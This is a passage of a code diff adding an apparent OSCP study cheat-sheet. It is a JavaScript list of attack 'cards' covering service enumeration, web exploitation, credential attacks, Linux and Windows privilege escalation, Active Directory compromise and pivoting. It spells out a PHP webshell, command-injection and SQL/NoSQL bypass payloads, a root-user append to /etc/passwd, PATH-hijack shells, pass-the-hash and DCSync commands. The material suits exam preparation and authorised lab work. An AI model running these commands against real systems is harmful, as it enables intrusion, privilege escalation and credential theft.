+  look:["Empty/weak root password","Password hashes to crack offline","FILE priv → read/write server files"],
+  triggers:{ports:[3306],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-mssql", phase:"enum", service:"mssql", title:"MSSQL enumeration (1433)",
+  summary:"sa creds → command execution path (manual).",
+  commands:[
+    {cmd:"crackmapexec mssql <IP> -u sa -p <pass>", note:"Validate creds."},
+    {cmd:"impacket-mssqlclient <user>:<pass>@<IP> -windows-auth", note:"Interactive client."},
+    {cmd:"# enable_xp_cmdshell then xp_cmdshell 'whoami' (review the steps)", note:"Manual RCE if you have sa."}],
+  look:["sa or weak SQL login","xp_cmdshell available / re-enableable","Linked servers to pivot"],
+  triggers:{ports:[1433],os:"windows",needsShell:false,type:"any"} },
+{ id:"enum-snmp", phase:"enum", service:"snmp", title:"SNMP enumeration (161/udp)",
+  summary:"Community strings leak processes, users, even creds.",
+  commands:[
+    {cmd:"snmpwalk -v2c -c public <IP>", note:"Try 'public' / 'private' first."},
+    {cmd:"snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25", note:"Windows user accounts."},
+    {cmd:"snmpwalk -v2c -c public <IP> hrSWRunParameters", note:"Process args — sometimes creds."}],
+  look:["Cleartext creds in process args","User lists for spraying","Installed software & versions"],
+  triggers:{ports:[161],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-nfs", phase:"enum", service:"nfs", title:"NFS enumeration (2049)",
+  summary:"Open exports = file access, sometimes a privesc primitive.",
+  commands:[
+    {cmd:"showmount -e <IP>", note:"List exported shares."},
+    {cmd:"sudo mount -t nfs <IP>:/export /mnt/nfs -o nolock", note:"Mount and browse."},
+    {cmd:"# note no_root_squash exports — see the privesc card", note:"Big deal for root."}],
+  look:["Readable home dirs / SSH keys","no_root_squash → privesc later","Writable exports to plant files"],
+  triggers:{ports:[2049],os:"linux",needsShell:false,type:"any"} },
+{ id:"enum-smtp", phase:"enum", service:"smtp", title:"SMTP enumeration (25)",
+  summary:"Verify valid usernames for spraying.",
+  commands:[
+    {cmd:"nmap -p25 --script smtp-commands,smtp-enum-users <IP>", note:"Commands + user enum."},
+    {cmd:"smtp-user-enum -M VRFY -U users.txt -t <IP>", note:"VRFY/EXPN/RCPT enumeration."}],
+  look:["VRFY/EXPN enabled","Valid users → password spray targets","Open relay (note it)"],
+  triggers:{ports:[25],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-dns", phase:"enum", service:"dns", title:"DNS enumeration (53)",
+  summary:"Zone transfers and subdomains expand the attack surface.",
+  commands:[
+    {cmd:"dig axfr @<IP> <domain>", note:"Full zone transfer if allowed."},
+    {cmd:"dig any @<IP> <domain>", note:"Records overview."},
+    {cmd:"# add discovered names to /etc/hosts and re-enum web", note:"Vhosts hide here."}],
+  look:["AXFR success → every host/record","Internal hostnames → vhost fuzzing","Mail/DC records for AD"],
+  triggers:{ports:[53],os:"any",needsShell:false,type:"any"} },
+{ id:"enum-ldap", phase:"enum", service:"ldap", title:"LDAP enumeration (389/636)",
+  summary:"Anonymous binds dump the directory.",
+  commands:[
+    {cmd:"ldapsearch -x -H ldap://<IP> -s base namingcontexts", note:"Find base DN."},
+    {cmd:"ldapsearch -x -H ldap://<IP> -b 'DC=domain,DC=local'", note:"Dump objects anonymously."},
+    {cmd:"nmap -p389 --script ldap-rootdse,ldap-search <IP>", note:"Quick rootDSE + search."}],
+  look:["Anonymous bind allowed","User descriptions with passwords","Domain/forest structure for AD"],
+  triggers:{ports:[389,636],os:"windows",needsShell:false,type:"ad"} },
+{ id:"enum-winrm", phase:"enum", service:"winrm", title:"WinRM (5985/5986)",
+  summary:"Not a foothold by itself — your shell once you have creds.",
+  commands:[
+    {cmd:"crackmapexec winrm <IP> -u <user> -p <pass>", note:"(Pwn3d!) = you can log in."},
+    {cmd:"evil-winrm -i <IP> -u <user> -p <pass>", note:"Interactive shell."},
+    {cmd:"evil-winrm -i <IP> -u <user> -H <nthash>", note:"Pass-the-hash login."}],
+  look:["Valid local/domain creds → shell","NT hash works (PtH)","Member of Remote Management Users"],
+  triggers:{ports:[5985,5986],os:"windows",needsShell:false,type:"any"} },
+{ id:"enum-rdp", phase:"enum", service:"rdp", title:"RDP (3389)",
+  summary:"GUI access with found creds; sometimes NLA-bypass vulns.",
+  commands:[
+    {cmd:"crackmapexec rdp <IP> -u <user> -p <pass>", note:"Validate before connecting."},
+    {cmd:"xfreerdp /v:<IP> /u:<user> /p:<pass> +clipboard /dynamic-resolution", note:"Connect."},
+    {cmd:"nmap -p3389 --script rdp-ntlm-info <IP>", note:"Leaks domain/hostname."}],
+  look:["Working creds → desktop","Domain/host info via NTLM","BlueKeep-class only after manual review"],
+  triggers:{ports:[3389],os:"windows",needsShell:false,type:"any"} },
+
+/* ---------- WEB VECTORS (12) ---------- */
+{ id:"web-dirbrute", phase:"web", service:"http", title:"Directory / content brute force",
+  summary:"Hidden paths are where the vuln usually lives.",
+  commands:[
+    {cmd:"feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50", note:"Recursive by default."},
+    {cmd:"gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html", note:"Extensions matter."},
+    {cmd:"feroxbuster -u http://<IP>/ -w <bigger-list> -x php,bak,zip,old", note:"Bigger list when stuck."}],
+  look:["admin/, backup/, dev/, /api","Source backups (.bak/.old/.zip)","Status 403 dirs worth probing"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-vhost", phase:"web", service:"http", title:"Vhost / subdomain brute force",
+  summary:"A whole second site can be name-based virtual-hosted.",
+  commands:[
+    {cmd:"ffuf -u http://<IP>/ -H 'Host: FUZZ.<domain>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>", note:"Filter the default page size."},
+    {cmd:"gobuster vhost -u http://<domain> -w <wordlist> --append-domain", note:"Alternative."},
+    {cmd:"# add hits to /etc/hosts, then re-run dir brute on each", note:"New host = new surface."}],
+  look:["Different content/size from baseline","dev/staging/internal vhosts","New login or upload forms"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-lfi", phase:"web", service:"http", title:"LFI / path traversal",
+  summary:"Read arbitrary files; escalate to RCE via log/wrapper poisoning.",
+  commands:[
+    {cmd:"curl 'http://<IP>/page.php?file=../../../../etc/passwd'", note:"Classic traversal."},
+    {cmd:"curl 'http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php'", note:"Leak PHP source."},
+    {cmd:"# LFI→RCE: poison access/auth log or use data:// — research manually", note:"Review before running."}],
+  look:["/etc/passwd or win.ini renders","Source via php://filter","Log paths you can poison"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-upload", phase:"web", service:"http", title:"File upload → webshell",
+  summary:"Get a writable, executable upload into the web root.",
+  commands:[
+    {cmd:"# upload a simple <?php system($_GET['c']); ?> as shell.php", note:"Type it yourself; no payload bundled here."},
+    {cmd:"# bypass filters: shell.php.jpg, .phtml, .php5, magic bytes, Content-Type", note:"Try each manually."},
+    {cmd:"curl 'http://<IP>/uploads/shell.php?c=id'", note:"Confirm execution, then reverse shell."}],
+  look:["Where uploaded files land (path)","Extension/MIME filter you can bypass","Execution confirmed → go for reverse shell"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-cmdi", phase:"web", service:"http", title:"Command injection",
+  summary:"User input reaching a shell = direct RCE.",
+  commands:[
+    {cmd:"# test separators in any field: ; | & `cmd` $(cmd) %0a", note:"e.g. 127.0.0.1; id"},
+    {cmd:"curl 'http://<IP>/ping?host=127.0.0.1;id'", note:"Confirm with id/whoami."},
+    {cmd:"# blind? force a delay or OOB: ; sleep 5  /  ; nslookup <yourhost>", note:"Time/OOB confirmation."}],
+  look:["Command output reflected","Time-based delay on sleep","Then upgrade to reverse shell"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-sqli", phase:"web", service:"http", title:"SQL injection (manual)",
+  summary:"sqlmap is BANNED on the exam — do SQLi by hand.",
+  commands:[
+    {cmd:"# break it: '  then  ' OR '1'='1  in login/params", note:"Look for errors / auth bypass."},
+    {cmd:"# UNION: ' ORDER BY n--  then  ' UNION SELECT 1,2,3--", note:"Find column count + reflected cols."},
+    {cmd:"# dump: ' UNION SELECT user,password FROM users--", note:"Adapt to the DB; read schema first."}],
+  look:["SQL error messages","Auth bypass via tautology","Reflected columns → dump creds (crack offline)"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-xss", phase:"web", service:"http", title:"XSS",
+  summary:"Lower OSCP value, but stored XSS can steal admin sessions.",
+  commands:[
+    {cmd:"# reflect test: <script>alert(1)<\/script> in params/fields", note:"Confirm execution context."},
+    {cmd:"# stored: plant a cookie-stealer pointing at your listener", note:"Build it yourself; manual."}],
+  look:["Input reflected unescaped","Stored & rendered for other users","Admin-only pages worth targeting"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-ssrf", phase:"web", service:"http", title:"SSRF",
+  summary:"Make the server request internal stuff you can't reach.",
+  commands:[
+    {cmd:"# point a url= param at http://127.0.0.1/ or internal hosts", note:"Reach localhost-only services."},
+    {cmd:"# cloud metadata if applicable: http://169.254.169.254/", note:"Rare on OSCP, but check."}],
+  look:["Internal-only ports/services exposed","Different responses for internal IPs","Chain to internal admin panel"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-idor", phase:"web", service:"http", title:"IDOR / broken access control",
+  summary:"Swap an id and access someone else's data/functions.",
+  commands:[
+    {cmd:"# change id=1 → id=2, /user/1 → /user/2, UUIDs in requests", note:"Use Burp to iterate."},
+    {cmd:"# hit admin-only endpoints directly as a low-priv user", note:"Forced browsing."}],
+  look:["Other users' data returned","Admin functions reachable","Predictable IDs"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-jwt", phase:"web", service:"http", title:"JWT attacks",
+  summary:"Weak signing = forge your way to admin.",
+  commands:[
+    {cmd:"# decode the token (base64) and inspect header/payload", note:"Check alg + claims."},
+    {cmd:"# alg:none bypass, or crack HS256 secret offline with hashcat", note:"hashcat -m 16500"},
+    {cmd:"# resign with the cracked secret, set role:admin", note:"Manual forge."}],
+  look:["alg:none accepted","Weak HMAC secret (crackable)","role/admin claims you can flip"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-verb", phase:"web", service:"http", title:"HTTP verb tampering",
+  summary:"Auth often only guards GET/POST.",
+  commands:[
+    {cmd:"curl -X PUT http://<IP>/path -d @shell.php", note:"Upload via PUT if enabled."},
+    {cmd:"nmap -p80 --script http-methods --script-args http-methods.url-path=/ <IP>", note:"List allowed verbs."},
+    {cmd:"# try HEAD/OPTIONS/PUT/DELETE to bypass GET/POST auth", note:"Method-based bypass."}],
+  look:["PUT/DELETE enabled","Auth bypass via alternate verb","WebDAV exposed"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-nosqli", phase:"web", service:"http", title:"NoSQL injection",
+  summary:"MongoDB-style apps bypass auth with operator injection.",
+  commands:[
+    {cmd:"# JSON login: {\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}", note:"Auth bypass."},
+    {cmd:"# form: user[$ne]=&pass[$ne]=", note:"Same idea, urlencoded."}],
+  look:["Login bypass with $ne/$gt","Different responses to operators","Mongo/Express stack"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+{ id:"web-cms", phase:"web", service:"http", title:"Known CMS (WordPress / Joomla / Drupal)",
+  summary:"Fingerprint the CMS + plugins, then searchsploit.",
+  commands:[
+    {cmd:"wpscan --url http://<IP>/ --enumerate u,vp,vt -v", note:"Users + vuln plugins/themes."},
+    {cmd:"droopescan scan drupal -u http://<IP>/", note:"Drupal/Joomla alt."},
+    {cmd:"searchsploit <cms> <version>", note:"Map version to a public exploit — review it."}],
+  look:["Plugin/theme version → known CVE","Enumerated users for login brute","Exposed config/backup files"],
+  triggers:{ports:[80,443,8080],os:"any",needsShell:false,type:"any"} },
+
+/* ---------- ACCESS / EXPLOIT / CREDS / SHELL ---------- */
+{ id:"acc-searchsploit", phase:"access", service:"any", title:"searchsploit a version → review → run manually",
+  summary:"Map every version to a public exploit. Read it before you run it.",
+  commands:[
+    {cmd:"searchsploit <product> <version>", note:"Find candidates."},
+    {cmd:"searchsploit -x <path>", note:"Read the code — understand what it does."},
+    {cmd:"searchsploit -m <path>", note:"Copy locally, edit IP/PORT, then run it yourself."}],
+  look:["Exact version match (not just product)","RCE/auth-bypass over DoS","Review code — no blind execution; this is exam-legal & required"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"acc-spray", phase:"access", service:"creds", title:"Spray found creds across every service",
+  summary:"Password reuse wins boxes. Try every cred everywhere.",
+  commands:[
+    {cmd:"crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success", note:"Sweep SMB."},
+    {cmd:"crackmapexec winrm <IP> -u <user> -p <pass>", note:"WinRM."},
+    {cmd:"hydra -L users.txt -P passwords.txt ssh://<IP>", note:"SSH/FTP/HTTP-form (allowed)."},
+    {cmd:"# also try the creds on web logins, DBs, RDP", note:"Manually, everywhere."}],
+  look:["One cred reused on another service","(Pwn3d!) in CME output","Domain creds working on local services"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"acc-crack", phase:"access", service:"creds", title:"Crack hashes offline (hashcat)",
+  summary:"Cracking is offline & allowed — it's not exploitation.",
+  commands:[
+    {cmd:"hashid '<hash>'   # or  hash-identifier", note:"Identify the mode first."},
+    {cmd:"hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt", note:"e.g. -m 1000 NTLM, -m 0 MD5."},
+    {cmd:"hashcat -m <mode> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", note:"Rules when straight dict fails."},
+    {cmd:"john --wordlist=rockyou.txt hashes.txt", note:"John alternative."}],
+  look:["Cracked plaintext → spray it","NTLM/Kerberos/web-app hashes","Use --show to recover cracked results"],
+  triggers:{ports:[],os:"any",needsShell:false,type:"any"} },
+{ id:"acc-pth", phase:"access", service:"creds", title:"Pass-the-Hash",
+  summary:"An NT hash is as good as the password for NTLM auth.",
+  commands:[
+    {cmd:"crackmapexec smb <IP> -u <user> -H <nthash>", note:"Validate the hash."},
+    {cmd:"evil-winrm -i <IP> -u <user> -H <nthash>", note:"WinRM with hash."},
+    {cmd:"impacket-psexec <user>@<IP> -hashes :<nthash>", note:"SYSTEM shell via PtH."}],
+  look:["Local admin hash reused across hosts","(Pwn3d!) over SMB/WinRM","Admin → psexec/wmiexec to SYSTEM"],
+  triggers:{ports:[445,5985],os:"windows",needsShell:false,type:"any"} },
+{ id:"shell-pty", phase:"access", service:"linux", title:"Stabilise a Linux shell (PTY upgrade)",
+  summary:"Turn a dumb reverse shell into a usable TTY.",
+  commands:[
+    {cmd:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", note:"Spawn a PTY."},
+    {cmd:"# Ctrl-Z, then: stty raw -echo; fg, then: export TERM=xterm", note:"Get arrows/tab/Ctrl-C."},
+    {cmd:"stty rows 50 cols 200", note:"Fix dimensions for editors."}],
+  look:["Working tab-complete + Ctrl-C","Editors (vi/nano) usable","Then go grab your proof"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"shell-proof", phase:"access", service:"any", title:"Capture proof at every level",
+  summary:"Points are screenshots. Grab proof the instant you land a shell.",
+  commands:[
+    {cmd:"cat local.txt ; id ; hostname ; ip a    # Linux foothold", note:"Flag + context in ONE screenshot."},
+    {cmd:"type proof.txt & whoami & ipconfig       # Windows root/SYSTEM", note:"Flag + ipconfig together."},
+    {cmd:"# screenshot includes the flag AND your IP in the same frame", note:"Required by the exam."}],
+  look:["local.txt at foothold, proof.txt at root","ip a / ipconfig visible with the flag","Partial progress is still points — document it"],
+  triggers:{ports:[],os:"any",needsShell:true,type:"any"} },
+
+/* ---------- LINUX PRIVESC ---------- */
+{ id:"pe-lin-enum", phase:"privesc-linux", service:"linux", title:"Linux privesc — initial enumeration",
+  summary:"Enumerate broadly first, then chase the obvious wins.",
+  commands:[
+    {cmd:"id; sudo -l; uname -a; cat /etc/os-release", note:"Who am I, what can I sudo, kernel."},
+    {cmd:"./linpeas.sh | tee linpeas.txt", note:"Run + read the highlighted findings."},
+    {cmd:"ps aux; netstat -tulpn; crontab -l; ls -la /home/*", note:"Manual sweep alongside peas."}],
+  look:["sudo -l entries","Internal services on 127.0.0.1 (pivot/forward)","World-writable files, creds in configs/history"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-sudo", phase:"privesc-linux", service:"linux", title:"sudo -l → GTFOBins",
+  summary:"Any binary you can sudo is a candidate root path.",
+  commands:[
+    {cmd:"sudo -l", note:"What can you run, as whom, NOPASSWD?"},
+    {cmd:"# look the binary up in your offline GTFOBins notes", note:"e.g. sudo find . -exec /bin/sh \\; -quit"},
+    {cmd:"sudo <binary> ...   # the GTFOBins sudo escape", note:"Run the documented escape manually."}],
+  look:["(ALL) NOPASSWD entries","LD_PRELOAD / env_keep set","Known GTFOBins sudo escape for the binary"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-suid", phase:"privesc-linux", service:"linux", title:"SUID / SGID binaries → GTFOBins",
+  summary:"Set-uid binaries run as the owner (often root).",
+  commands:[
+    {cmd:"find / -perm -4000 -type f 2>/dev/null", note:"All SUID binaries."},
+    {cmd:"find / -perm -2000 -type f 2>/dev/null", note:"SGID too."},
+    {cmd:"# unusual binary? check GTFOBins for the SUID escape", note:"e.g. ./find . -exec /bin/sh -p \\;"}],
+  look:["Non-standard SUID binary","Custom binary → strings/ltrace it","GTFOBins SUID entry exists"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-cap", phase:"privesc-linux", service:"linux", title:"Linux capabilities",
+  summary:"cap_setuid on the right binary = instant root.",
+  commands:[
+    {cmd:"getcap -r / 2>/dev/null", note:"Find files with capabilities."},
+    {cmd:"# e.g. python with cap_setuid+ep:", note:"./python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"}],
+  look:["cap_setuid / cap_setgid +ep","cap_dac_read_search (read any file)","Interpreter binaries with caps"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-cron", phase:"privesc-linux", service:"linux", title:"Cron jobs & writable scripts",
+  summary:"A root cron running a script you can edit = root.",
+  commands:[
+    {cmd:"cat /etc/crontab; ls -la /etc/cron.*", note:"System cron jobs."},
+    {cmd:"# find scripts you can write that root runs", note:"ls -la the script path."},
+    {cmd:"# also watch for short-interval jobs with pspy", note:"./pspy64 to see hidden crons/processes."}],
+  look:["root cron calls a writable script","Wildcard cron → tar/rsync injection","PATH-relative command in a root job"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-nfs", phase:"privesc-linux", service:"linux", title:"NFS no_root_squash",
+  summary:"Mount it from your box and plant a root SUID shell.",
+  commands:[
+    {cmd:"cat /etc/exports   # or: showmount -e <IP>", note:"Look for no_root_squash."},
+    {cmd:"# on attacker (as root): mount, drop a SUID binary owned by root", note:"chown root:root + chmod 4755"},
+    {cmd:"# back on target: run the planted SUID shell -p", note:"Manual root."}],
+  look:["no_root_squash export","Writable export mountable","SUID survives onto the target"],
+  triggers:{ports:[2049],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-passwd", phase:"privesc-linux", service:"linux", title:"Writable /etc/passwd or /etc/shadow",
+  summary:"Write access to passwd = add a root user.",
+  commands:[
+    {cmd:"ls -la /etc/passwd /etc/shadow", note:"Check who can write."},
+    {cmd:"openssl passwd -1 -salt x Pass123", note:"Generate a hash to insert."},
+    {cmd:"# append  hacker:<hash>:0:0:root:/root:/bin/bash  then su hacker", note:"Manual root."}],
+  look:["/etc/passwd writable","/etc/shadow readable (crack it)","backups of shadow lying around"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-path", phase:"privesc-linux", service:"linux", title:"PATH hijack on a SUID/root binary",
+  summary:"A privileged program calling a command by name, not path.",
+  commands:[
+    {cmd:"strings ./suidbin    # or ltrace it", note:"Spot a relative command call (e.g. 'service')."},
+    {cmd:"echo '/bin/bash -p' > /tmp/<cmd>; chmod +x /tmp/<cmd>", note:"Your malicious 'command'."},
+    {cmd:"export PATH=/tmp:$PATH; ./suidbin", note:"It runs your version as root."}],
+  look:["SUID binary calls bare command name","Writable dir prependable to PATH","system()/popen() with relative path"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+{ id:"pe-lin-kernel", phase:"privesc-linux", service:"linux", title:"Kernel exploit (LAST resort)",
+  summary:"Unstable — can crash the box. Exhaust everything else first.",
+  commands:[
+    {cmd:"uname -a; cat /etc/os-release", note:"Exact kernel + distro."},
+    {cmd:"searchsploit linux kernel <version>", note:"Find a matching local-root — review it."},
+    {cmd:"# compile + run manually; understand the risk", note:"May panic the VM. Snapshot mentally first."}],
+  look:["Old, specific kernel version","A well-known stable PoC (e.g. DirtyPipe/CoW range)","Everything else already tried"],
+  triggers:{ports:[],os:"linux",needsShell:true,type:"any"} },
+
+/* ---------- WINDOWS PRIVESC ---------- */
+{ id:"pe-win-enum", phase:"privesc-windows", service:"windows", title:"Windows privesc — initial enumeration",
+  summary:"Privileges, services, and stored creds are the usual wins.",
+  commands:[
+    {cmd:"whoami /all & systeminfo", note:"Token privileges + OS/patch level."},
+    {cmd:".\\winPEASany.exe | Out-File peas.txt", note:"Run + read highlights."},
+    {cmd:"net user & net localgroup administrators", note:"Accounts & admins."}],
+  look:["SeImpersonate/SeAssignPrimaryToken → Potato","Unquoted/weak services","Creds in files, registry, history"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+{ id:"pe-win-priv", phase:"privesc-windows", service:"windows", title:"whoami /priv → Potato (SeImpersonate)",
+  summary:"Token-impersonation privs → SYSTEM via a Potato.",
+  commands:[
+    {cmd:"whoami /priv", note:"Look for SeImpersonatePrivilege / SeAssignPrimaryToken."},
+    {cmd:".\\PrintSpoofer64.exe -i -c cmd", note:"If SeImpersonate present."},
+    {cmd:".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"", note:"Modern fallback; review usage."}],
+  look:["SeImpersonatePrivilege Enabled","Service account (often has it)","Got SYSTEM → grab proof.txt"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+{ id:"pe-win-service", phase:"privesc-windows", service:"windows", title:"Service misconfigurations",
+  summary:"Unquoted paths, weak perms, or writable binaries → SYSTEM.",
+  commands:[
+    {cmd:"wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\"", note:"Unquoted-path candidates."},
+    {cmd:"accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula", note:"Services you can modify."},
+    {cmd:"sc qc <service>   # then  sc config <svc> binPath= \"...\"  / replace the exe", note:"Hijack, then restart the service."}],
+  look:["Unquoted path with a writable gap","SERVICE_CHANGE_CONFIG you hold","Writable service binary/dir"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+{ id:"pe-win-aie", phase:"privesc-windows", service:"windows", title:"AlwaysInstallElevated",
+  summary:"Both registry flags set = install an MSI as SYSTEM.",
+  commands:[
+    {cmd:"reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", note:"Must be 1."},
+    {cmd:"reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", note:"Must also be 1."},
+    {cmd:"msiexec /quiet /qn /i evil.msi   # build a benign-payload MSI yourself", note:"Manual; no payload bundled here."}],
+  look:["Both HKCU and HKLM = 0x1","Can write/run an MSI","SYSTEM after install"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+{ id:"pe-win-creds", phase:"privesc-windows", service:"windows", title:"Stored credentials hunt",
+  summary:"Windows leaves creds in many places — go look.",
+  commands:[
+    {cmd:"cmdkey /list", note:"Saved creds → runas /savecred."},
+    {cmd:"reg query HKLM /f password /t REG_SZ /s", note:"Registry passwords (autologon etc.)."},
+    {cmd:"findstr /si password *.xml *.ini *.txt *.config", note:"Files with passwords."},
+    {cmd:"# unattend.xml, sysprep.inf, Groups.xml (GPP cpassword)", note:"Decrypt GPP cpassword offline."}],
+  look:["cmdkey saved creds","Autologon DefaultPassword","GPP cpassword / unattend creds"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+{ id:"pe-win-task", phase:"privesc-windows", service:"windows", title:"Scheduled tasks & autoruns",
+  summary:"A privileged task running a file you control → SYSTEM.",
+  commands:[
+    {cmd:"schtasks /query /fo LIST /v | findstr /i \"taskname run author\"", note:"Tasks + who they run as."},
+    {cmd:"# check the task's binary/script permissions (accesschk)", note:"Writable = hijack."},
+    {cmd:"reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", note:"Autoruns too."}],
+  look:["Task runs as SYSTEM/admin","Writable target file/dir","Autorun pointing at writable path"],
+  triggers:{ports:[],os:"windows",needsShell:true,type:"any"} },
+
+/* ---------- ACTIVE DIRECTORY ---------- */
+{ id:"ad-enum", phase:"ad", service:"ad", title:"AD assumed-breach enumeration",
+  summary:"With one set of domain creds, map the whole domain.",
+  commands:[
+    {cmd:"crackmapexec smb <subnet> -u <user> -p <pass>", note:"Sweep hosts; find where you're admin."},
+    {cmd:"bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c All", note:"Collect for BloodHound."},
+    {cmd:"crackmapexec ldap <DC> -u <user> -p <pass> --users --groups", note:"Users/groups via LDAP."}],
+  look:["Paths to Domain Admin in BloodHound","Hosts where your user is local admin","High-value groups / ACL abuses"],
+  triggers:{ports:[88,389,445],os:"windows",needsShell:false,type:"ad"} },
+{ id:"ad-kerberoast", phase:"ad", service:"ad", title:"Kerberoasting",
+  summary:"Request service tickets, crack them offline for SPN creds.",
+  commands:[
+    {cmd:"impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request", note:"Dump TGS hashes."},
+    {cmd:"hashcat -m 13100 spns.txt rockyou.txt", note:"Crack offline (allowed)."}],
+  look:["Service accounts with SPNs","Crackable service passwords","Often high-priv service accounts"],
+  triggers:{ports:[88],os:"windows",needsShell:false,type:"ad"} },
+{ id:"ad-asrep", phase:"ad", service:"ad", title:"AS-REP roasting",
+  summary:"Accounts without pre-auth give a crackable hash with no creds.",
+  commands:[
+    {cmd:"impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC> -no-pass", note:"No creds needed."},
+    {cmd:"impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <DC>", note:"Authenticated variant."},
+    {cmd:"hashcat -m 18200 asrep.txt rockyou.txt", note:"Crack offline."}],
+  look:["DONT_REQ_PREAUTH accounts","Crackable AS-REP hash","Foothold creds with zero auth"],
+  triggers:{ports:[88],os:"windows",needsShell:false,type:"ad"} },
+{ id:"ad-spray", phase:"ad", service:"ad", title:"Password spray (WATCH lockout)",
+  summary:"One weak password across many users — but mind the policy.",
+  commands:[
+    {cmd:"crackmapexec smb <DC> -u '' -p '' --pass-pol", note:"READ the lockout policy FIRST."},
+    {cmd:"crackmapexec smb <DC> -u users.txt -p 'Season2024!' --continue-on-success", note:"ONE password, all users."},
+    {cmd:"# stay well under the lockout threshold; space attempts", note:"Locking accounts can fail the box."}],
+  look:["Lockout threshold & window","Seasonal/company-name passwords","A single hit → re-enumerate as that user"],
+  triggers:{ports:[445,88],os:"windows",needsShell:false,type:"ad"} },
+{ id:"ad-lateral", phase:"ad", service:"ad", title:"Lateral movement",
+  summary:"Move host-to-host with creds or hashes.",
+  commands:[
+    {cmd:"evil-winrm -i <IP> -u <user> -p <pass>", note:"WinRM shell."},
+    {cmd:"impacket-psexec <domain>/<user>:<pass>@<IP>", note:"SYSTEM via SMB (psexec)."},
+    {cmd:"impacket-wmiexec <domain>/<user>:<pass>@<IP>", note:"Quieter than psexec."},
+    {cmd:"impacket-psexec <user>@<IP> -hashes :<nthash>", note:"Pass-the-Hash lateral."}],
+  look:["Local-admin reuse across hosts","Working PtH","Path toward the DC"],
+  triggers:{ports:[445,5985],os:"windows",needsShell:false,type:"ad"} },
+{ id:"ad-dcsync", phase:"ad", service:"ad", title:"DCSync / secretsdump",
+  summary:"Replication rights (or DA) → dump every hash in the domain.",
+  commands:[
+    {cmd:"impacket-secretsdump <domain>/<user>:<pass>@<DC>", note:"DCSync all NTLM hashes."},
+    {cmd:"impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<DC>", note:"Target a single account."},
+    {cmd:"# then PtH as Administrator → full compromise + proof", note:"krbtgt = golden-ticket capable."}],
+  look:["DCSync rights (GetChanges/All)","Administrator NThash","krbtgt hash — domain owned"],
+  triggers:{ports:[445],os:"windows",needsShell:true,type:"ad"} },
+
+/* ---------- PIVOTING ---------- */
+{ id:"piv-ssh", phase:"pivot", service:"pivot", title:"SSH port forwarding + proxychains",
+  summary:"Reach a second network through a compromised host.",
+  commands:[
+    {cmd:"ssh -L 8080:127.0.0.1:80 user@<pivot>", note:"Local: expose remote :80 on your :8080."},
+    {cmd:"ssh -R 9001:127.0.0.1:9001 user@<pivot>", note:"Remote: bring your listener to the target side."},
